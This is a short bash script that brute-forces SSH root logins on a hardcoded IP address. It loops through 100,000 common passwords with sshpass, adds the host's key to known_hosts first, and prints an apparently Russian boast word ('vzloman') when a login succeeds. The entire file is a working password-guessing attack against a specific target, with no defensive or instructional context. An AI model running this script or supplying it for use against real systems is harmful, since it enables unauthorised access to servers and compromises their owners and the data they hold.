#!/bin/bash

file=""
host="46.101.146.236"
user=root
pass=$(cat 10_million_password_list_top_100000.txt)
port=22


#while true


fingerprint () {
	if cat ~/.ssh/known_hosts | grep $host
		then echo "'ECDSA key fingerprint is present in ~/.ssh/known_hosts'"
        	else ssh-keyscan  $host >> ~/.ssh/known_hosts 
	fi
}
fingerprint


for i in $pass
	do
           echo $i
	   sshpass -p $i ssh -p $port -q $user@$host exit && result="vzloman"
           if [ "$result" = "vzloman" ]
                then echo "vzloman!!!"
	   exit 0
	   #else echo 
         fi
done
